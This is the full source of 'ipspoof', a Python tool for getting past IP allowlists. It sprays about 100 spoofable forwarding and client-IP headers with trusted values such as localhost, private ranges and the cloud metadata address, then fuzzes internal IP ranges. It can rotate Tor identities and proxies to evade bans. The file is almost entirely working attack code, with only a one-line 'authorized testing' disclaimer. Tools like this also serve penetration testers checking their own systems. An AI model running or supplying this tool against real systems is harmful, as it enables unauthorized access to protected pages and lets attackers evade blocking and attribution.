#!/usr/bin/env python3
"""
ipspoof — HTTP header/IP allowlist bypass discovery tool.

Authorized security testing only. Use against systems you own or have
explicit permission to test.

Quick start:
  ipspoof -u http://target/login.php --follow
  ipspoof -u http://target/ --body-regex "dashboard|welcome"
  ipspoof -i
"""

import argparse
import hashlib
import json as jsonlib
import re
import socket
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── ANSI ─────────────────────────────────────────────────
G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; C = "\033[96m"
DIM = "\033[2m"; B = "\033[1m"; RST = "\033[0m"

# ═════════════════════════════════════════════════════════
# HEADER WORDLIST
# ═════════════════════════════════════════════════════════
HEADERS = sorted(set([
    "X-Forwarded-For", "X_FORWARDED_FOR", "X-Forwarded", "X_FORWARDED",
    "X-Forwarded-For-Original", "X-Forwarded-For-IP", "X_FORWARDED_FOR_IP",
    "X-Forwarded-By", "X-Forwarded-Server", "X-Forwarded-Host",
    "Forwarded", "FORWARDED", "Forwarded-For", "FORWARDED-FOR",
    "Forwarded-For-IP", "FORWARDED-FOR-IP", "Forward-For", "FORWARD_FOR",
    "X-Real-IP", "X_REAL_IP", "X-Real-IP-Original", "Real-IP",
    "X-Client-IP", "CLIENT_IP", "Client-IP", "HTTP-CLIENT-IP",
    "X-Originating-IP", "X-Original-IP", "X-Original-Remote-Addr",
    "X-Originally-Forwarded-For", "X-From-IP", "X-From",
    "X-Remote-IP", "X-Remote-Addr", "PC_REMOTE_ADDR", "HTTP-PC-REMOTE-ADDR",
    "Remote-Addr", "REMOTE_ADDR",
    "X-True-Client-IP", "True-Client-IP", "X_True-Client-IP",
    "CF-Connecting-IP", "CF_CONNECTING_IP", "True-Client-IP-CF",
    "Fastly-Client-IP", "X-Azure-ClientIP", "X-Appengine-Remote-Addr",
    "X-Envoy-External-Address",
    "X-ProxyUser-IP", "X-ProxyUser-Ip", "X-Proxy-IP", "X-ProxyMesh-IP",
    "Proxy-Client-IP", "WL-Proxy-Client-IP", "HTTP-XROXY-CONNECTION",
    "XROXY_CONNECTION", "X-Proxy-Connection", "Proxy-Connection",
    "PROXY_CONNECTION", "CONNECT_VIA_IP", "XPROXY",
    "XONNECTION", "X_Connection",
    "Via", "VIA", "HTTP-VIA", "X-BlueCoat-Via",
    "X-Original-URL", "X-Override-URL", "X-Rewrite-URL", "X-Original-Host",
    "X-Host", "X-Gateway-Host", "X-Backend-Host",
    "X-Ip", "Source-IP", "COMING_FROM", "X_COMING_FROM",
    "X-Delegating-Remote-Host", "X_DELEGATE_REMOTE_HOST",
    "X-Imforwards", "X_IMFORWARDS", "HTTP-X-IMFORWARDS",
    "X-Locking", "X_LOCKING", "X-Looking", "X_LOOKING",
    "X-Cluster-Client-IP", "X_CLUSTER_CLIENT_IP", "Cluster-Client-IP",
    "HTTP-X-FORWARDED-FOR-IP", "HTTP-FORWARDED-FOR-IP", "HTTP-FORWARDED-FOR",
    "Z-Forwarded-For",
    "X-Cache-Info", "ZCACHE_CONTROL", "CACHE_INFO",
    "Pragma", "PRAGMA", "Proxy-Authorization", "PROXY_AUTHORIZATION",
    "X-Server-IP", "X-Forwarded-Server-IP",
    "X-Forwarded-Proto", "Front-End-Https",
]))

TRUSTED_IPS = [
    "127.0.0.1", "localhost", "0.0.0.0", "::1",
    "10.0.0.1", "10.10.10.1", "10.10.10.10",
    "172.16.0.1", "192.168.0.1", "192.168.1.1",
    "169.254.169.254",
]

CHAINABLE_KEYWORDS = ("forwarded", "real", "client", "remote", "originating",
                      "x-ip", "proxy", "via")


# ═════════════════════════════════════════════════════════
# HELPERS
# ═════════════════════════════════════════════════════════
@dataclass
class Result:
    header: str
    value: str
    status: int
    size: int
    reason: str


_thread_local = threading.local()


def get_session(cookies=None):
    if not hasattr(_thread_local, "session"):
        s = requests.Session()
        if cookies:
            for k, v in cookies.items():
                s.cookies.set(k, v)
        _thread_local.session = s
    return _thread_local.session


class RateLimiter:
    def __init__(self, rate):
        self.rate = rate
        self.interval = 1.0 / rate if rate > 0 else 0.0
        self.last = 0.0
        self.lock = threading.Lock()

    def wait(self):
        if self.rate <= 0:
            return
        with self.lock:
            now = time.time()
            delta = self.interval - (now - self.last)
            if delta > 0:
                time.sleep(delta)
                self.last = time.time()
            else:
                self.last = now


class ProxyRotator:
    def __init__(self, proxies=None, use_tor=False, tor_new_every=0):
        self.proxies = list(proxies or [])
        self.use_tor = use_tor
        self.tor_new_every = tor_new_every
        self.counter = 0
        self.index = 0
        self.lock = threading.Lock()

    def next(self):
        with self.lock:
            self.counter += 1
            if self.use_tor:
                if self.tor_new_every and self.counter % self.tor_new_every == 0:
                    self._signal_newnym()
                return {"http": "socks5h://127.0.0.1:9050",
                        "https": "socks5h://127.0.0.1:9050"}
            if not self.proxies:
                return None
            p = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            return {"http": p, "https": p}

    def _signal_newnym(self):
        try:
            s = socket.create_connection(("127.0.0.1", 9051), timeout=3)
            s.sendall(b'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\nQUIT\r\n')
            s.close()
            print(f"\n{Y}[*] Tor identity rotated (NEWNYM){RST}")
        except Exception as e:
            print(f"\n{Y}[!] Tor NEWNYM failed: {e}{RST}")


def probe(url, headers, timeout, follow, cookies, proxy, verify,
          method="GET", data=None, json_data=None, limiter=None):
    if limiter:
        limiter.wait()
    session = get_session(cookies)
    kwargs = dict(headers=headers, timeout=timeout,
                  allow_redirects=follow, proxies=proxy, verify=verify)
    try:
        m = method.upper()
        if m == "GET":
            r = session.get(url, **kwargs)
        elif m == "POST":
            r = session.post(url, json=json_data, data=data, **kwargs)
        elif m == "PUT":
            r = session.put(url, json=json_data, data=data, **kwargs)
        elif m == "PATCH":
            r = session.patch(url, json=json_data, data=data, **kwargs)
        elif m == "DELETE":
            r = session.delete(url, **kwargs)
        elif m == "HEAD":
            r = session.head(url, **kwargs)
        else:
            r = session.request(m, url, json=json_data, data=data, **kwargs)
        content = r.content
        return r.status_code, len(content), hashlib.sha256(content).hexdigest(), content, None
    except requests.exceptions.RequestException as e:
        return None, None, None, None, str(e)


def is_anomaly(base, current, args):
    b_status, b_size, b_hash, b_body = base
    status, size, h, body, err = current
    if status is None:
        return None

    reasons = []

    if args.body_regex:
        try:
            now_match = re.search(args.body_regex, body.decode("utf-8", "ignore"))
            base_match = re.search(args.body_regex, b_body.decode("utf-8", "ignore"))
            if now_match and not base_match:
                reasons.append("regex")
        except re.error as e:
            print(f"{R}[!] Regex error: {e}{RST}")
            sys.exit(1)
        return reasons or None

    if status != b_status:
        reasons.append(f"status({b_status}->{status})")
    elif b_size == 0 and size > 0:
        reasons.append(f"size(0->{size})")
    elif b_size > 0 and abs(size - b_size) / max(b_size, size, 1) > args.size_tol:
        reasons.append(f"size({b_size}->{size})")

    if args.body_hash and h != b_hash:
        reasons.append("hash")

    return reasons or None


# ═════════════════════════════════════════════════════════
# BASELINE
# ═════════════════════════════════════════════════════════
def baseline(url, args, proxy, cookies):
    print(f"{C}[*] Fetching baseline: {url}{RST}")
    status, size, h, body, err = probe(
        url, {}, args.timeout, args.follow, cookies, proxy, False,
        method=args.method, data=args.data, json_data=args.json_data,
    )
    if err:
        print(f"{R}[!] Baseline error: {err}{RST}")
        sys.exit(1)
    print(f"{C}[*] Baseline -> status={status}  size={size}  hash={h[:12]}{RST}\n")
    return status, size, h, body


# ═════════════════════════════════════════════════════════
# PHASE 1 — header discovery
# ═════════════════════════════════════════════════════════
def phase1(url, base, args, proxy_rotator, cookies):
    print(f"{C}[*] Phase 1: Header discovery ({len(HEADERS)} headers x {len(args.trusted_ips)} IPs){RST}")

    tasks = [(h, ip) for ip in args.trusted_ips for h in HEADERS]
    total = len(tasks)
    hits = []
    done = 0
    t0 = time.time()

    def worker(h, ip):
        proxy = proxy_rotator.next()
        res = probe(url, {h: ip}, args.timeout, args.follow, cookies, proxy, False,
                    method=args.method, data=args.data, json_data=args.json_data,
                    limiter=args._limiter)
        return h, ip, res

    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futs = [ex.submit(worker, h, ip) for h, ip in tasks]
        for f in as_completed(futs):
            h, ip, res = f.result()
            done += 1
            if done % 50 == 0 or done == total:
                print(f"{DIM}    ... {done}/{total}{RST}", end="\r")
            reasons = is_anomaly(base, res, args)
            if reasons:
                r = Result(h, ip, res[0], res[1], ",".join(reasons))
                hits.append(r)
                print(f"\n{G}[+] HIT: {h}: {ip}  ->  status={res[0]} size={res[1]}  [{r.reason}]{RST}")

    print(f"\n{C}[*] Phase 1 complete in {time.time()-t0:.1f}s. {len(hits)} anomalies.{RST}\n")
    return hits


# ═════════════════════════════════════════════════════════
# PHASE 2 — IP fuzz (+ optional chain)
# ═════════════════════════════════════════════════════════
def build_test_values(header, ip, chain):
    values = [ip]
    if chain and any(k in header.lower() for k in CHAINABLE_KEYWORDS):
        values += [f"1.2.3.4, {ip}", f"{ip}, 1.2.3.4", f"{ip}, {ip}", f"for={ip}"]
    return values


def phase2(url, hits, base, args, proxy_rotator, cookies):
        if not args.ip_pattern:
            print(f"{Y}[!] --ip-pattern not set, skipping Phase 2.{RST}")
            return []
    
        ip_range = parse_range(args.ip_range)
        headers_to_try = sorted({h.header for h in hits})
        total_ips = len(ip_range)
        chain_multiplier = 1 + (4 if args.chain else 0)
    
        print(f"{C}[*] Phase 2: IP fuzz  ({len(headers_to_try)} headers x {total_ips} IPs "
              f"x {chain_multiplier} variation{'s' if chain_multiplier > 1 else ''}){RST}")
        print(f"{DIM}    Headers: {', '.join(headers_to_try)}{RST}")
    
        # Show range preview
        first_ip = args.ip_pattern.format(n=ip_range[0])
        last_ip = args.ip_pattern.format(n=ip_range[-1])
        print(f"{DIM}    Range  : {first_ip} ... {last_ip}  ({total_ips} IPs){RST}")
    
        if args.verbose:
            print(f"{DIM}    Full IP list: {', '.join(args.ip_pattern.format(n=n) for n in ip_range)}{RST}")
        print()
    
        tasks = []
        for h in headers_to_try:
            for n in ip_range:
                ip = args.ip_pattern.format(n=n)
                for v in build_test_values(h, ip, args.chain):
                    tasks.append((h, v, ip))
    
        results = []
        tested = {}          # ip -> status
        total = len(tasks)
        done = 0
        t0 = time.time()
    
        def worker(h, value, ip):
            proxy = proxy_rotator.next()
            res = probe(url, {h: value}, args.timeout, args.follow, cookies, proxy, False,
                        method=args.method, data=args.data, json_data=args.json_data,
                        limiter=args._limiter)
            return h, value, ip, res
    
        with ThreadPoolExecutor(max_workers=args.threads) as ex:
            futs = [ex.submit(worker, h, v, ip) for h, v, ip in tasks]
            for f in as_completed(futs):
                h, value, ip, res = f.result()
                done += 1
                if done % 50 == 0 or done == total:
                    print(f"{DIM}    ... {done}/{total}{RST}", end="\r")
    
                # Track tested IPs
                if ip not in tested:
                    tested[ip] = res[0]
    
                if args.verbose and res[0] is not None:
                    status_str = f"{G}{res[0]}{RST}" if res[0] != base[0] else f"{DIM}{res[0]}{RST}"
                    print(f"\n{DIM}    [try] {h}: {value}  ->  {status_str} size={res[1]}{RST}")
    
                reasons = is_anomaly(base, res, args)
                if reasons:
                    r = Result(h, value, res[0], res[1], ",".join(reasons))
                    results.append(r)
                    print(f"\n{G}[+] HIT: {h}: {value}  ->  status={res[0]} size={res[1]}  [{r.reason}]{RST}")
    
        print(f"\n{C}[*] Phase 2 complete in {time.time()-t0:.1f}s. "
              f"Tested {len(tested)} unique IPs across {len(headers_to_try)} header(s). "
              f"{len(results)} anomalies.{RST}")
    
        # Show what was tested and what came back
        if not results:
            statuses = sorted(set(tested.values()), key=lambda x: (x is None, x))
            print(f"{Y}[!] No bypass found in this range. "
                  f"All responses matched baseline (status={base[0]} size={base[1]}).{RST}")
            print(f"{DIM}    Status codes seen: {', '.join(str(s) for s in statuses)}{RST}")
            print(f"{DIM}    Tip: try a wider range (--ip-range 1-254), different pattern "
                  f"(--ip-pattern), or --chain for XFF variations.{RST}")
        else:
            print(f"{C}[*] Phase 2 summary:{RST}")
            for r in results:
                print(f"    {G}{r.header:<30}{RST} value={r.value:<20} "
                      f"status={r.status} size={r.size}  [{r.reason}]")
    
        print()
        return results


def parse_range(s):
    if "-" in s:
        a, b = s.split("-", 1)
        return list(range(int(a), int(b) + 1))
    return [int(x) for x in s.split(",") if x.strip()]


# ═════════════════════════════════════════════════════════
# OUTPUT
# ═════════════════════════════════════════════════════════
def save_output(path, base, phase1_hits, phase2_hits, args):
    data = {
        "url": args.url,
        "method": args.method,
        "baseline": {"status": base[0], "size": base[1], "hash": base[2]},
        "phase1": [h.__dict__ for h in phase1_hits],
        "phase2": [h.__dict__ for h in phase2_hits],
        "config": {
            "follow": args.follow,
            "threads": args.threads,
            "chain": args.chain,
            "body_regex": args.body_regex,
            "body_hash": args.body_hash,
            "tor": args.tor,
            "rate": args.rate,
        },
    }
    with open(path, "w") as f:
        jsonlib.dump(data, f, indent=2)
    print(f"{G}[+] Results saved: {path}{RST}")


# ═════════════════════════════════════════════════════════
# INTERACTIVE MODE
# ═════════════════════════════════════════════════════════
def interactive_setup(base_args):
    print(f"{C}=== Interactive Mode ==={RST}")
    url = input("Target URL: ").strip()
    if not url:
        print(f"{R}[!] URL is required.{RST}")
        sys.exit(1)

    threads = input("Threads [30]: ").strip() or "30"
    follow = input("Follow redirects? [y/N]: ").strip().lower() == "y"
    method = (input("Method [GET]: ").strip() or "GET").upper()

    data = None
    json_data = None
    if method in ("POST", "PUT", "PATCH"):
        d = input("POST data (key=val&key2=val2, empty to skip): ").strip()
        if d:
            data = d

    cookie = input("Cookie (empty to skip): ").strip() or None
    body_regex = input("Body regex (empty to skip): ").strip() or None

    advanced = input("Advanced options (Tor/proxy/rate)? [y/N]: ").strip().lower() == "y"
    proxy_file = None
    tor = False
    rate = 0
    tor_new_every = 0
    if advanced:
        pf = input("Proxy file (empty to skip): ").strip()
        if pf:
            proxy_file = pf
        tor = input("Use Tor? [y/N]: ").strip().lower() == "y"
        if tor:
            tne = input("Rotate Tor identity every N requests [0=never]: ").strip() or "0"
            tor_new_every = int(tne)
        rate = int(input("Rate limit (req/s, 0=unlimited): ").strip() or "0")

    phase2_choice = input("Run Phase 2 (IP fuzz)? [y/N]: ").strip().lower() == "y"
    ip_pattern = "10.10.10.{n}"
    ip_range = "1-254"
    if phase2_choice:
        ip_pattern = input("IP pattern [10.10.10.{n}]: ").strip() or ip_pattern
        ip_range = input("IP range [1-254]: ").strip() or "1-254"

    base_args.url = url
    base_args.threads = int(threads)
    base_args.follow = follow
    base_args.method = method
    base_args.data = data
    base_args.json_data = json_data
    base_args.cookie = cookie
    base_args.body_regex = body_regex
    base_args.proxy_file = proxy_file
    base_args.tor = tor
    base_args.tor_new_every = tor_new_every
    base_args.rate = rate
    base_args.phase2 = phase2_choice
    base_args.ip_pattern = ip_pattern
    base_args.ip_range = ip_range
    return base_args


# ═════════════════════════════════════════════════════════
# MAIN
# ═════════════════════════════════════════════════════════
EPILOG ="""
{B}ADVANCED FEATURES (opt-in):{RST}
  --proxy-file FILE      Rotate through a list of proxies
  --tor                  Route through Tor SOCKS5 (127.0.0.1:9050)
  --tor-new-every N      Rotate Tor identity every N requests (control port 9051)
  --rate N               Max N requests/second (avoid bans)
  --chain                XFF chain variations (1.2.3.4, <ip> / <ip>, 1.2.3.4)
  --body-hash            Treat different body hash as HIT
  --body-regex PATTERN   Only treat body regex match as HIT
  --size-tol X           Size difference tolerance (default 0.05 = 5%)
  -o/--output FILE       Save results as JSON
  -v, --verbose          Print each request/response in Phase 2

{B}EXAMPLES:{RST}
  # Basic
  ipspoof -u http://target/ --follow

  # Interactive
  ipspoof -i

  # POST login attempt
  ipspoof -u http://target/login.php -X POST -d "user=a&pass=b"

  # Precise detection: only pages containing dashboard/welcome
  ipspoof -u http://target/ --body-regex "dashboard|welcome"

  # Tor with periodic identity rotation
  ipspoof -u http://target/ --tor --tor-new-every 10

  # Proxy list + rate-limit
  ipspoof -u http://target/ --proxy-file proxies.txt --rate 30

  
  # Verbose Phase 2 (see every IP tried)
  ipspoof -u http://target/ --phase2 --ip-pattern "127.0.0.{{n}}" -v
"""


def build_argparser():
    ap = argparse.ArgumentParser(
        prog="ipspoof",
        description="HTTP header/IP allowlist bypass discovery tool for authorized security testing.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=EPILOG,
    )
    ap.add_argument("-u", "--url", help="Target URL (required unless -i)")
    ap.add_argument("-i", "--interactive", action="store_true", help="Interactive mode")
    ap.add_argument("-t", "--threads", type=int, default=30, help="Concurrent threads (default 30)")
    ap.add_argument("--timeout", type=float, default=8.0, help="Request timeout (default 8s)")
    ap.add_argument("--follow", action="store_true", help="Follow redirects")
    ap.add_argument("-c", "--cookie", help="Cookie string")

    ap.add_argument("-X", "--method", default="GET",
                    help="HTTP method (GET/POST/PUT/... — default GET)")
    ap.add_argument("-d", "--data", help="Form data (for POST)")
    ap.add_argument("--json", dest="json_data", help="JSON body (for POST)")
    ap.add_argument("-H", "--header", action="append", default=[],
                    help="Extra static header (repeatable: -H 'A: b')")

    ap.add_argument("--proxy", help="Single proxy (http://127.0.0.1:8080)")
    ap.add_argument("--proxy-file", help="Proxy list file (one per line)")
    ap.add_argument("--tor", action="store_true", help="Route through Tor SOCKS5")
    ap.add_argument("--tor-new-every", type=int, default=0,
                    help="Rotate Tor identity every N requests")

    ap.add_argument("--rate", type=int, default=0, help="Max req/s (0=unlimited)")

    ap.add_argument("--body-regex", help="Only treat body regex match as HIT")
    ap.add_argument("--body-hash", action="store_true", help="Treat hash change as HIT")
    ap.add_argument("--size-tol", type=float, default=0.05, help="Size tolerance (default 0.05)")
    ap.add_argument("--chain", action="store_true", help="Try XFF chain variations")

    ap.add_argument("--ip", action="append", default=None,
                    help="IPs to try in Phase 1 (repeatable)")
    ap.add_argument("--phase2", action="store_true", help="Run IP fuzz phase")
    ap.add_argument("--ip-pattern", default="10.10.10.{n}", help="Phase 2 IP pattern")
    ap.add_argument("--ip-range", default="1-254", help="Phase 2 IP range")
    ap.add_argument("--show-all", action="store_true", help="Debug: show all responses")
    ap.add_argument("-o", "--output", help="Save results as JSON file")
    ap.add_argument("-v", "--verbose", action="store_true", help="Print each request/response detail (Phase 2)")
    return ap


def main(argv=None):
    ap = build_argparser()
    args = ap.parse_args(argv)

    # Interactive only when explicitly requested
    if args.interactive:
        args = interactive_setup(args)
    elif not args.url:
        ap.print_help()
        sys.exit(2)

    from . import __version__

    title = f"ipspoof v{__version__} — header/IP allowlist bypass"
    author = "Created by Exript"
    width = 46

    print(f"{C}┌{'─' * (width + 2)}┐")
    print(f"│ {title:<{width}} │")
    print(f"│ {author:<{width}} │")
    print(f"└{'─' * (width + 2)}┘{RST}")
    if args.body_regex:
        print(f"  Body regex: {args.body_regex}")
    if args.body_hash:
        print(f"  Body hash : on")
    if args.chain:
        print(f"  Chain     : on")
    if args.proxy_file:
        print(f"  Proxy file: {args.proxy_file}")
    if args.tor:
        print(f"  Tor       : on (rotate every {args.tor_new_every})")
    if args.rate:
        print(f"  Rate      : {args.rate} req/s")
    print()

    # Proxy setup
    proxies_list = []
    if args.proxy_file:
        try:
            with open(args.proxy_file) as f:
                proxies_list = [l.strip() for l in f if l.strip() and not l.startswith("#")]
            print(f"{G}[+] Loaded {len(proxies_list)} proxies.{RST}")
        except FileNotFoundError:
            print(f"{R}[!] Proxy file not found: {args.proxy_file}{RST}")
            sys.exit(1)
    elif args.proxy:
        proxies_list = [args.proxy]

    proxy_rotator = ProxyRotator(
        proxies=proxies_list,
        use_tor=args.tor,
        tor_new_every=args.tor_new_every,
    )

    cookies = {}
    if args.cookie:
        for kv in args.cookie.split(";"):
            if "=" in kv:
                k, v = kv.strip().split("=", 1)
                cookies[k] = v

    static_headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            static_headers[k.strip()] = v.strip()

    args.trusted_ips = args.ip if args.ip else TRUSTED_IPS
    args._limiter = RateLimiter(args.rate) if args.rate > 0 else None

    if args.json_data:
        try:
            args.json_data = jsonlib.loads(args.json_data)
        except jsonlib.JSONDecodeError:
            print(f"{R}[!] Invalid JSON: {args.json_data}{RST}")
            sys.exit(1)

    base = baseline(args.url, args, proxy_rotator.next(), cookies)
    args._static_headers = static_headers

    hits = phase1(args.url, base, args, proxy_rotator, cookies)
    if not hits:
        print(f"{R}[!] No anomalies found.{RST}")
        print(f"{Y}    Tips: try --ip with more values, add --follow, "
              f"switch detection with --body-regex/--body-hash.{RST}")
        if args.output:
            save_output(args.output, base, [], [], args)
        return

    print(f"{C}[*] Phase 1 summary:{RST}")
    for r in hits:
        print(f"    {G}{r.header:<30}{RST} value={r.value:<20} "
              f"status={r.status} size={r.size}  [{r.reason}]")

    phase2_hits = []
    if args.phase2:
        phase2_hits = phase2(args.url, hits, base, args, proxy_rotator, cookies)

    if args.output:
        save_output(args.output, base, hits, phase2_hits, args)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Interrupted by user.{RST}")
        sys.exit(130)
